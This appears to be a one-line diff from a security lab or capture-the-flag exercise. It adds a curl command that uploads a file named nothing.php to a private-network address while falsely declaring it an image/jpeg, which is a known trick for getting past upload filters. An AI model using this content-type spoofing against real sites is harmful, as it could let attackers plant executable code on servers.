@@ -1,0 +1,1 @@
+curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=nothing.php;type=image/jpeg' http://192.168.40.128/index.php\?page=\upload\#
